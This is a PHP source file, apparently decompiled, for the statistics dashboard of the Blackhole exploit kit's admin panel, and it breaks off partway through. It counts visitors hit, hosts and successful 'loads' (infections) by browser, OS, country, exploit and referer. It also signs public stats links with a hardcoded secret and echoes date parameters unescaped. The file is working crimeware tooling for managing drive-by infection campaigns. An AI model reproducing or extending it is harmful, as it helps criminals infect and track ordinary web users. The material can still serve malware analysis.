<?php 
if( !defined("ADMIN_LOADED") ) 
{
    exit();
}

define("PAGE", "index");
$startDate = (isset($_GET["startDate"]) ? strtotime($_GET["startDate"]) : null);
$endDate = (isset($_GET["endDate"]) ? (strtotime($_GET["endDate"]) + 3600 * 24) - 1 : null);
$threadID = (isset($_GET["threadID"]) ? intval($_GET["threadID"]) : null);
$ruleID = (isset($_GET["ruleID"]) ? intval($_GET["ruleID"]) : null);
if( $ruleID == 0 ) 
{
    $ruleID = null;
}

$browsers = Logs::getstatisticsbybrowser($startDate, $endDate, $threadID, $ruleID);
$threads = Logs::getstatisticsbythread($startDate, $endDate, $threadID, $ruleID);
$oses = Logs::getstatisticsbyos($startDate, $endDate, $threadID, $ruleID);
$countries = Logs::getstatisticsbycountry($startDate, $endDate, $threadID, $ruleID);
$exploits = Logs::getstatisticsbyexploit($startDate, $endDate, $threadID, $ruleID);
$showReferers = Config::get("ShowReferers", 1);
if( $showReferers ) 
{
    $referers = Logs::getstatisticsbyreferers($startDate, $endDate, $threadID, $ruleID);
}

$stats = Logs::getglobalstatistics($threadID, $ruleID);
$stats2 = Logs::getglobalstatisticstoday($threadID, $ruleID);
if( isset($_GET["startDate"]) ) 
{
    $stats3 = Logs::getglobalstatisticsperiod($threadID, $ruleID, $startDate, $endDate);
}

$widgetsData = Logs::getstatisticsbywidgets($startDate, $endDate, $threadID, $ruleID);
$paramsForBrowsers = array(  );
if( $startDate != null ) 
{
    $paramsForBrowsers[] = "StartDate=" . $startDate;
}

if( $endDate != null ) 
{
    $paramsForBrowsers[] = "EndDate=" . $endDate;
}

if( $threadID != null ) 
{
    $paramsForBrowsers[] = "ThreadID=" . $threadID;
}

if( $ruleID != null ) 
{
    $paramsForBrowsers[] = "RuleID=" . $ruleID;
}

$paramForBrowsers = (count($paramsForBrowsers) != 0 ? "&" . implode("&", $paramsForBrowsers) : "");
$fulls = array(  );
foreach( $_COOKIE as $name => $value ) 
{
    if( strpos($name, "full-") === false ) 
    {
        continue;
    }

    if( $value == 0 ) 
    {
        continue;
    }

    $browserId = str_replace("full-", "", $name);
    $full = Logs::getfullstatisticsbybrowser($browserId, $startDate, $endDate, $threadID, $ruleID);
    $fulls[$browserId] = $full;
}
$fullt = array(  );
foreach( $_COOKIE as $name => $value ) 
{
    if( strpos($name, "fullt-") === false ) 
    {
        continue;
    }

    if( $value == 0 ) 
    {
        continue;
    }

    $threadId = str_replace("fullt-", "", $name);
    $full = Logs::getfullstatisticsbythread($threadId, $startDate, $endDate, $threadID, $ruleID);
    $fullt[$threadId] = $full;
}
$fulle = array(  );
foreach( $_COOKIE as $name => $value ) 
{
    if( strpos($name, "fulle-") === false ) 
    {
        continue;
    }

    if( $value == 0 ) 
    {
        continue;
    }

    $threadId = str_replace("fulle-", "", $name);
    $full = Logs::getfullstatisticsbyexploit($threadId, $startDate, $endDate, $threadID, $ruleID);
    $fulle[$threadId] = $full;
}
$fullsr = array(  );
if( $showReferers ) 
{
    foreach( $_COOKIE as $name => $value ) 
    {
        if( strpos($name, "fullr-") === false ) 
        {
            continue;
        }

        if( $value == 0 ) 
        {
            continue;
        }

        $refererDomain = str_replace("fullr-", "", $name);
        $refererDomain = str_replace("_", ".", $refererDomain);
        $full = Logs::getfullstatisticsbyreferer($refererDomain, $startDate, $endDate, $threadID, $ruleID);
        $fullsr[$refererDomain] = $full;
    }
}

$secs = Lang::get("Seconds");
$min = Lang::get("Minute");
$mins = Lang::get("Minutes");
$intervals = array( "never" => "never", 5 => "5 " . $secs, 10 => "10 " . $secs, 20 => "20 " . $secs, 30 => "30 " . $secs, 60 => "1 " . $min, 120 => "2 " . $mins, 300 => "5 " . $mins, 600 => "10 " . $mins );
$imgPath = Config::get("AdminScriptName") . "?" . Config::get("MainParamName") . "=file&type=img&file=";
if( $threadID != null ) 
{
    $thread = db::selectone("*", "Threads", "ID=" . $threadID);
    if( $ruleID != null ) 
    {
        $startDate = db::select("select DateTime from Logs where (ThreadID = " . $threadID . ") and (RuleID = " . $ruleID . ") order by DateTime asc limit 0,1");
    }
    else
    {
        $startDate = db::select("select DateTime from Logs where ThreadID = " . $threadID . " order by DateTime asc limit 0,1");
    }

}
else
{
    $startDate = db::select("select DateTime from Logs order by DateTime asc limit 0,1");
}

if( 0 < count($startDate) ) 
{
    $startDate = $startDate[0]["DateTime"];
}
else
{
    $startDate = time();
}

echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\r\n\t\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head>\r\n\t\r\n\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/>\r\n\r\n\t";
if( isset($_SESSION[Config::get("AuthVariable", "Auth")]) ) 
{
    echo "\t\t<title>Blackhole v.";
    echo Config::get("Version");
    echo "</title>\r\n\t";
}
else
{
    echo "\t\t<title>Statistics</title>\r\n\t";
}

echo "\t<script type=\"text/javascript\" src=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=file&type=js&file=min.js\"></script>\r\n\t\r\n\t<link rel=\"stylesheet\" href=\"";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=file&type=css&file=main.css\" type=\"text/css\" media=\"screen\" />\r\n\r\n\t<script type=\"text/javascript\">\r\n\t\t";
if( !isset($_GET["threadID"]) ) 
{
    echo "\t\t\tPortalSettings = {\r\n\t\t\t\t\t\t\t'column-1' : [";
    echo Prefs::get("column-1");
    echo "],\r\n\t\t\t\t\t\t\t'column-2' : [false,";
    echo Prefs::get("column-2");
    echo "]\r\n\t\t\t\t\t\t};\r\n\t\t";
}
else
{
    echo "\t\t\tPortalSettings = {\r\n\t\t\t\t\t\t\t'column-1' : ['block-1','block-2'],\r\n\t\t\t\t\t\t\t'column-2' : ['block-3','block-5','block-4']\r\n\t\t\t\t\t\t};\r\n\t\t";
}

echo "\t\t\r\n\t\toptions \t= { portal \t\t\t: 'columns2', \r\n\t\t\t\t\t\t\teditorEnabled \t: true, \r\n\t\t\t\t\t\t\thandle\t\t\t: 'drag',\r\n\t\t\t\t\t\t\tsaveurl \t\t: '";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=savePrefs' };\r\n\t\tvar portal;\r\n\t\t\t\t\r\n\t\tEvent.observe(window, 'load', function() {\r\n\t\t\tportal = new Portal(PortalSettings, options, {}";
if( isset($_GET["threadID"]) ) 
{
    echo ", true";
}

echo ");\r\n\t\t\tXaprb.InputMask.setupElementMasks();\r\n\t\t\tvar el = \$\$('.interval')[0];\r\n\t\t\tif (\$('intImg') != null) {\r\n\t\t\t\tel.observe('mouseover', function() {\$('intImg').show();});\r\n\t\t\t\tel.observe('mouseout', function() {\$('intImg').hide();});\r\n\t\t\t}\r\n\t\t});\r\n\t\t\r\n\t\tIcons = {};\r\n\t\tIcons.countries = {};\r\n\t\t";
foreach( Browser::$icons as $type => $arr ) 
{
    foreach( $arr as &$a ) 
    {
        $a = "" . "'" . $a . "'";
    }
    echo "\t\t\tIcons.";
    echo $type;
    echo " = [";
    echo implode(",", $arr);
    echo "];\r\n\t\t";
}
echo "\t\t";
$arr = array(  );
foreach( Browser::$countryCodes as $t ) 
{
    $arr[] = "'" . strtolower($t) . "'";
}
echo "\t\tIcons.countries = [";
echo implode(",", $arr);
echo "];\r\n\t\t\r\n\t\tTitles = {\r\n\t\t\t'HostsLabel' : '";
echo Lang::get("StatisticsHostsLabel");
echo "',\r\n\t\t\t'HitsLabel' : '";
echo Lang::get("StatisticsHitsLabel");
echo "',\r\n\t\t\t'LoadsLabel' : '";
echo Lang::get("StatisticsLoadsLabel");
echo "',\r\n\t\t\t'PercentLabel' : '";
echo Lang::get("StatisticsPercentLabel");
echo "',\r\n\t\t\t'CloseAskLabel' : '";
echo Lang::get("CloseAskLabel");
echo "',\r\n\t\t\t'PercentTotal' : '";
echo Lang::get("PercentTotalLabel");
echo "'\r\n\t\t};\r\n\t\t\r\n\t\tTables = {};\r\n\t\t\r\n\t\tfunction updateTimeout() {\r\n\t\t\tvar sel = document.getElementById(\"updateTimeout\");\r\n\t\t\tclearTimeout(Autoupdater.timer);\r\n\t\t\t\r\n\t\t\tvar last = Autoupdater.interval;\r\n\t\t\t\r\n\t\t\tvar el = \$('updateTimeoutLabel');\r\n\t\t\tif (el == null) return;\r\n\t\t\t\r\n\t\t\tel.update(\"";
echo Lang::get("AutoupdateInterval");
echo ": <b>\" + sel.options[sel.selectedIndex].innerHTML + '</b>');\r\n\t\t\t\r\n\t\t\tif (sel.selectedIndex != 0) {\r\n\t\t\t\tAutoupdater.start(sel.options[sel.selectedIndex].value);\r\n\t\t\t} else {\r\n\t\t\t\tAutoupdater.start(9999);\r\n\t\t\t}\r\n\t\t};\r\n\t\tfdSliderController.addEvent(window, 'load', updateTimeout);\r\n\t</script>\r\n</head>\r\n<body>\r\n\t<div id=\"addWidgetContainer\"></div>\r\n\t<div id=\"fullWidgetContainer\"></div>\r\n\t<div id=\"alert\" style=\"display:none;\">\r\n\t\t<div class=\"alertContent\">\r\n\t\t\t<div id=\"alertTitle\">Delete widget?</div>\r\n\t\t\t<div class=\"confirm\">\r\n\t\t\t\t<div id=\"apply\">Delete</div>\r\n\t\t\t\t<div id=\"cancel\" onclick=\"Alert.cancel()\">Cancel</div>\r\n\t\t\t</div>\r\n\t\t</div>\r\n\t</div>\r\n\t<div class=\"pageLayout";
if( isset($_GET["threadID"]) ) 
{
    echo " threadStatistic";
}

echo "\">\r\n\t\t<div class=\"test\"><div class=\"test2\">\r\n\t\t\t";
if( !isset($_GET["threadID"]) ) 
{
    echo "\t\t\t\t";
    include("menu.php");
    echo "\t\t\t";
}
else
{
    echo "\t\t\t\t<script>\r\n\t\t\t\t\tConfig = {\r\n\t\t\t\t\t\tAdminScriptName : '";
    echo Config::get("AdminScriptName");
    echo "',\r\n\t\t\t\t\t\tMainParamName : '";
    echo Config::get("MainParamName");
    echo "',\r\n\t\t\t\t\t\tLibDir : '";
    echo Config::get("LibDir");
    echo "',\r\n\t\t\t\t\t\tTemplatesDir : '";
    echo Config::get("TemplatesDir");
    echo "',\r\n\t\t\t\t\t\tCurTemplate : '";
    echo Template::getcurtemplate();
    echo "',\r\n\t\t\t\t\t\tImgPath : '";
    echo $imgPath;
    echo "'\r\n\t\t\t\t\t}\r\n\t\t\t\t</script>\r\n\t\t\t";
}

echo "\t\t\t\r\n\t\t\t\r\n\t\t\t<div class=\"parameters\"";
if( isset($_GET["threadID"]) ) 
{
    echo "style=\"height:80px;\"";
}

echo ">\r\n\t\t\t\t<div class=\"form\">\r\n\t\t\t\t\t";
if( isset($_GET["threadID"]) ) 
{
    echo "\t\t\t\t\t\t<div class=\"selectedThread\">\r\n\t\t\t\t\t\t\t&nbsp;\r\n\t\t\t\t\t\t\t";
    if( isset($_SESSION[Config::get("AuthVariable", "Auth")]) ) 
    {
        echo "\t\t\t\t\t\t\t";
        echo Lang::get("ThreadStat");
        echo ": \"";
        echo $thread["Title"];
        echo "\"\r\n\t\t\t\t\t\t\t";
        if( $ruleID != null ) 
        {
            echo "\t\t\t\t\t\t\t\t";
            echo Lang::get("RuleStat");
            echo ": \"";
            echo db::selectone("Title", "Rules", "ID = " . intval($ruleID));
            echo "\"\r\n\t\t\t\t\t\t\t";
        }

        echo "\t\t\t\t\t\t\t\t<div class=\"close\" onclick=\"window.location = '";
        echo Config::get("AdminScriptName");
        echo "?";
        echo Config::get("MainParamName");
        echo "=threads'\"></div>\r\n\t\t\t\t\t\t\t\t<div class=\"public\">\r\n\t\t\t\t\t\t\t\t\t";
        echo Lang::get("PublicLink");
        echo ":\r\n\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t";
    }

    echo "\t\t\t\t\t\t</div>\r\n\t\t\t\t\t";
}

echo "\t\t\t\t\t<form action=\"";
echo Config::get("AdminScriptName");
echo "\" method=\"get\">\r\n\t\t\t\t\t\t";
if( isset($_GET["threadID"]) ) 
{
    echo "\t\t\t\t\t\t\t<input type=\"hidden\" name=\"threadID\" value=\"";
    echo intval($_GET["threadID"]);
    echo "\"/>\r\n\t\t\t\t\t\t";
}

echo "\t\t\t\t\t\t<div class=\"date\">\r\n\t\t\t\t\t\t\t<div class=\"dateLabel\">";
echo Lang::get("StartDate");
echo ":</div>\r\n\t\t\t\t\t\t\t<div class=\"dateInput\">\r\n\t\t\t\t\t\t\t\t<div>\r\n\t\t\t\t\t\t\t\t\t<input name=\"startDate\" class=\"input_mask mask_date_us\" id=\"startDate\" value=\"";
echo (isset($_GET["startDate"]) ? $_GET["startDate"] : "");
echo "\"/>\r\n\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t<div>\r\n\t\t\t\t\t\t\t\t\t<script language=\"JavaScript\">\r\n\t\t\t\t\t\t\t\t\t\tvar cal = new tcal ({'controlname':'startDate'}, {\r\n\t\t\t\t\t\t\t\t\t\t\t'imgpath': '";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=file&type=img&file='\r\n\t\t\t\t\t\t\t\t\t\t}, new Date(";
echo date("Y", $startDate);
echo ", ";
echo date("m", $startDate) - 1;
echo ", ";
echo date("d", $startDate);
echo "));\r\n\t\t\t\t\t\t\t\t\t</script>\r\n\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t<div class=\"date\">\r\n\t\t\t\t\t\t\t<div class=\"dateLabel\">";
echo Lang::get("EndDate");
echo ":</div>\r\n\t\t\t\t\t\t\t<div class=\"dateInput\">\r\n\t\t\t\t\t\t\t\t<div>\r\n\t\t\t\t\t\t\t\t\t<input name=\"endDate\" class=\"input_mask mask_date_us\" id=\"endDate\" value=\"";
echo (isset($_GET["endDate"]) ? $_GET["endDate"] : "");
echo "\"/>\r\n\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t<div>\r\n\t\t\t\t\t\t\t\t\t<script language=\"JavaScript\">\r\n\t\t\t\t\t\t\t\t\t\tnew tcal ({'controlname':'endDate'}, {\r\n\t\t\t\t\t\t\t\t\t\t\t'imgpath': '";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=file&type=img&file='\r\n\t\t\t\t\t\t\t\t\t\t}, new Date(";
echo date("Y", $startDate);
echo ", ";
echo date("m", $startDate) - 1;
echo ", ";
echo date("d", $startDate);
echo "));\r\n\t\t\t\t\t\t\t\t\t</script>\r\n\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t<div class=\"applyBtn\"><input type=\"submit\" value=\"";
echo Lang::get("FormApplyButton");
echo "\"/></div>\r\n\t\t\t\t\t\t";
if( !isset($_GET["threadID"]) ) 
{
    echo "\t\t\t\t\t\t<div class=\"interval\">\r\n\t\t\t\t\t\t\t<div class=\"intervalLabel\"><label for=\"updateTimeout\" id=\"updateTimeoutLabel\"></label></div>\r\n\t\t\t\t\t\t\t<select name=\"updateTimeout\" id=\"updateTimeout\" class=\"fd_slider fd_callback_updateTimeout\"> \r\n\t\t\t\t\t\t\t\t";
    foreach( $intervals as $interval => $title ) 
    {
        echo "\t\t\t\t\t\t\t\t\t<option value=\"";
        echo $interval;
        echo "\" ";
        echo ($interval == Config::get("AjaxAutoreloadInterval") ? "selected=\"selected\"" : "");
        echo ">";
        echo $title;
        echo "</option>\r\n\t\t\t\t\t\t\t\t";
    }
    echo "\t\t\t\t\t\t\t</select> \r\n\t\t\t\t\t\t\t<br/><img src=\"";
    echo $imgPath;
    echo "intervals.png\" style=\"margin-left:146px;display:none;\" id=\"intImg\"/>\r\n\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t";
}
else
{
    if( isset($_SESSION[Config::get("AuthVariable", "Auth")]) ) 
    {
        echo "\t\t\t\t\t\t\t<div class=\"interval\">\r\n\t\t\t\t\t\t\t\t<input type=\"text\" value=\"http://";
        echo $_SERVER["HTTP_HOST"];
        echo substr($_SERVER["REQUEST_URI"], 0, strpos($_SERVER["REQUEST_URI"], Config::get("AdminScriptName")) - 1);
        echo "/";
        echo Config::get("StatFileName");
        echo ".php?threadID=";
        echo $_GET["threadID"];
        echo "&ruleID=";
        echo (isset($_GET["ruleID"]) ? intval($_GET["ruleID"]) : 0);
        echo "&key=";
        echo md5($_GET["threadID"] . ((isset($_GET["ruleID"]) ? intval($_GET["ruleID"]) : 0)) . "W#%^Q&V*)%#evywuitvo#Q57836Q&%v8935ve");
        echo "\"/>\r\n\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t";
    }

}

echo "\t\t\t\t\t</form>\r\n\t\t\t\t</div>\r\n\t\t\t</div>\r\n\t\t\t<div class=\"content";
if( isset($_GET["threadID"]) ) 
{
    echo " locked";
}

echo "\">\r\n\t\t\t\t<div id=\"columns2\">\r\n\t\t\t\t\t<div id=\"column-1\" class=\"column blocks\">\r\n\t\t\t\t\t\t<div class=\"mainStatistic block\" id=\"block-0\">\r\n\t\t\t\t\t\t\t";
if( $stats["hited"] != 0 ) 
{
    $perc = _obfuscated_0D300F132528172B191728400B102A3D141C391D153122_($stats["hosts"] / $stats["hited"] * 100);
}
else
{
    $perc = 0;
}

if( $stats["hosts2"] != 0 ) 
{
    $perc2 = _obfuscated_0D300F132528172B191728400B102A3D141C391D153122_($stats["executed"] / $stats["hosts2"] * 100, 2);
}
else
{
    $perc2 = 0;
}

if( $perc < 0 ) 
{
    $perc = 0;
}

if( $perc2 < 0 ) 
{
    $perc2 = 0;
}

$perc2 = _obfuscated_0D300F132528172B191728400B102A3D141C391D153122_($perc2);
$val = ceil(0.047 * $perc * $perc2 - 18);
if( $val < 0 ) 
{
    $val = 0;
}

echo "\t\t\t\t\t\t\t<div class=\"title drag\">";
echo Lang::get("Statistic");
echo "</div>\r\n\t\t\t\t\t\t\t<div class=\"info\">\r\n\t\t\t\t\t\t\t\t";
echo Lang::get("TotalInfo");
echo "<br/>\r\n\t\t\t\t\t\t\t\t<span><b id=\"hitsTotal\">";
echo $stats["hited"];
echo "</b> ";
echo Lang::get("Hited");
echo " <img src=\"";
echo $imgPath;
echo "stat1.png\" width=\"20px\" height=\"10px\"/></span>\r\n\t\t\t\t\t\t\t\t<span><b id=\"hostsTotal\">";
echo $stats["hosts"];
echo "</b> ";
echo Lang::get("Hosts");
echo " <img src=\"";
echo $imgPath;
echo "stat2.png\" width=\"20px\" height=\"10px\"/></span>\r\n\t\t\t\t\t\t\t\t<span><b id=\"executedTotal\">";
echo $stats["executed"];
echo "</b> ";
echo Lang::get("Loads");
echo " <img src=\"";
echo $imgPath;
echo "stat3.png\" width=\"20px\" height=\"10px\"/></span>\r\n\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t<div class=\"stat\">\r\n\t\t\t\t\t\t\t\t<span id=\"percentTotal\">";
echo $perc2;
echo "%</span>\r\n\t\t\t\t\t\t\t\t<br/>\r\n\t\t\t\t\t\t\t\t";
echo Lang::get("LoadsTotal");
echo "\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t\t<div class=\"chart\">\r\n\t\t\t\t\t\t\t\t<div class=\"c1\">\r\n\t\t\t\t\t\t\t\t\t<div class=\"c2\">\r\n\t\t\t\t\t\t\t\t\t\t<div class=\"c3\">\r\n\t\t\t\t\t\t\t\t\t\t\t<div class=\"c4\" style=\"width:";
echo $perc;
echo "%;\" id=\"totalChart1\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c5\" style=\"width:";
echo ceil(4.7 * $perc - 18);
echo "px;\" id=\"totalChart1_1\"></div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c6\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c7\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c11\" style=\"width:";
echo $perc2;
echo "%;\" id=\"totalChart2\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c8\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c9\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c10\" style=\"width:";
echo $val;
echo "px;\" id=\"totalChart2_1\"></div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t";
if( $perc2 == 0 ) 
{
    echo "<script>\$('totalChart2').setStyle({opacity:'0'});</script>";
}

echo "\t\t\t\t\t\t\t";
if( $stats2["hited"] != 0 ) 
{
    $perc = _obfuscated_0D300F132528172B191728400B102A3D141C391D153122_($stats2["hosts"] / $stats2["hited"] * 100);
}
else
{
    $perc = 0;
}

if( $stats2["hosts2"] != 0 ) 
{
    $perc2 = _obfuscated_0D300F132528172B191728400B102A3D141C391D153122_($stats2["executed"] / $stats2["hosts2"] * 100, 2);
}
else
{
    $perc2 = 0;
}

if( $perc < 0 ) 
{
    $perc = 0;
}

if( $perc2 < 0 ) 
{
    $perc2 = 0;
}

$perc2 = _obfuscated_0D300F132528172B191728400B102A3D141C391D153122_($perc2);
$val = ceil(0.047 * $perc * $perc2 - 10);
if( $val < 0 ) 
{
    $val = 0;
}

echo "\t\t\t\t\t\t\t<div class=\"odd\">\r\n\t\t\t\t\t\t\t\t<div class=\"info\">\r\n\t\t\t\t\t\t\t\t\t";
echo Lang::get("TodayInfo");
echo "<br/>\r\n\t\t\t\t\t\t\t\t\t<span><b id=\"hitsTotal2\">";
echo $stats2["hited"];
echo "</b> ";
echo Lang::get("Hited");
echo " <img src=\"";
echo $imgPath;
echo "stat1.png\" width=\"20px\" height=\"10px\"/></span>\r\n\t\t\t\t\t\t\t\t\t<span><b id=\"hostsTotal2\">";
echo $stats2["hosts"];
echo "</b> ";
echo Lang::get("Hosts");
echo " <img src=\"";
echo $imgPath;
echo "stat2.png\" width=\"20px\" height=\"10px\"/></span>\r\n\t\t\t\t\t\t\t\t\t<span><b id=\"executedTotal2\">";
echo $stats2["executed"];
echo "</b> ";
echo Lang::get("Loads");
echo " <img src=\"";
echo $imgPath;
echo "stat3.png\" width=\"20px\" height=\"10px\"/></span>\r\n\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t<div class=\"stat\">\r\n\t\t\t\t\t\t\t\t\t<span id=\"percentTotal2\">";
echo $perc2;
echo "%</span>\r\n\t\t\t\t\t\t\t\t\t<br/>\r\n\t\t\t\t\t\t\t\t\t";
echo Lang::get("LoadsTotal");
echo "\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t\t\t<div class=\"chart2\">\r\n\t\t\t\t\t\t\t\t\t<div class=\"c1\">\r\n\t\t\t\t\t\t\t\t\t\t<div class=\"c2\">\r\n\t\t\t\t\t\t\t\t\t\t\t<div class=\"c3\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c4\" style=\"width:";
echo $perc;
echo "%;\" id=\"todayChart1\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c5\" style=\"width:";
echo ceil(4.7 * $perc - 10);
echo "px;\" id=\"todayChart1_1\"></div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c6\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c7\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c11\" style=\"width:";
echo $perc2;
echo "%;min-width:10px;\" id=\"todayChart2\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c8\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c9\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c10\" style=\"width:";
echo $val;
echo "px;\" id=\"todayChart2_1\"></div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t";
if( $perc2 == 0 ) 
{
    echo "<script>\$('todayChart2').setStyle({opacity:'0'});</script>";
}

echo "\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t";
if( isset($_GET["startDate"]) ) 
{
    echo "\t\t\t\t\t\t\t\t";
    if( $stats3["hited"] != 0 ) 
    {
        $perc = _obfuscated_0D300F132528172B191728400B102A3D141C391D153122_($stats3["hosts"] / $stats3["hited"] * 100);
    }
    else
    {
        $perc = 0;
    }

    if( $stats3["hosts2"] != 0 ) 
    {
        $perc2 = _obfuscated_0D300F132528172B191728400B102A3D141C391D153122_($stats3["executed"] / $stats3["hosts2"] * 100, 2);
    }
    else
    {
        $perc2 = 0;
    }

    if( $perc < 0 ) 
    {
        $perc = 0;
    }

    if( $perc2 < 0 ) 
    {
        $perc2 = 0;
    }

    $perc2 = _obfuscated_0D300F132528172B191728400B102A3D141C391D153122_($perc2);
    $val = ceil(0.047 * $perc * $perc2 - 10);
    if( $val < 0 ) 
    {
        $val = 0;
    }

    echo "\t\t\t\t\t\t\t\t<div class=\"odd\">\r\n\t\t\t\t\t\t\t\t\t<div class=\"info\">\r\n\t\t\t\t\t\t\t\t\t\t";
    echo Lang::get("PeriodInfo");
    echo "<br/>\r\n\t\t\t\t\t\t\t\t\t\t<span><b id=\"hitsTotal3\">";
    echo $stats3["hited"];
    echo "</b> ";
    echo Lang::get("Hited");
    echo " <img src=\"";
    echo $imgPath;
    echo "stat1.png\" width=\"20px\" height=\"10px\"/></span>\r\n\t\t\t\t\t\t\t\t\t\t<span><b id=\"hostsTotal3\">";
    echo $stats3["hosts"];
    echo "</b> ";
    echo Lang::get("Hosts");
    echo " <img src=\"";
    echo $imgPath;
    echo "stat2.png\" width=\"20px\" height=\"10px\"/></span>\r\n\t\t\t\t\t\t\t\t\t\t<span><b id=\"executedTotal3\">";
    echo $stats3["executed"];
    echo "</b> ";
    echo Lang::get("Loads");
    echo " <img src=\"";
    echo $imgPath;
    echo "stat3.png\" width=\"20px\" height=\"10px\"/></span>\r\n\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t<div class=\"stat\">\r\n\t\t\t\t\t\t\t\t\t\t<span id=\"percentTotal3\">";
    echo $perc2;
    echo "%</span>\r\n\t\t\t\t\t\t\t\t\t\t<br/>\r\n\t\t\t\t\t\t\t\t\t\t";
    echo Lang::get("LoadsTotal");
    echo "\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t<div style=\"clear:both;\"></div>\r\n\t\t\t\t\t\t\t\t\t<div class=\"chart2\">\r\n\t\t\t\t\t\t\t\t\t\t<div class=\"c1\">\r\n\t\t\t\t\t\t\t\t\t\t\t<div class=\"c2\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c3\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c4\" style=\"width:";
    echo $perc;
    echo "%;\" id=\"todayChart3\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c5\" style=\"width:";
    echo ceil(4.7 * $perc - 10);
    echo "px;\" id=\"todayChart3_1\"></div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c6\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c7\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c11\" style=\"width:";
    echo $perc2;
    echo "%;min-width:10px;\" id=\"todayChart4\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c8\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c9\">\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<div class=\"c10\" style=\"width:";
    echo $val;
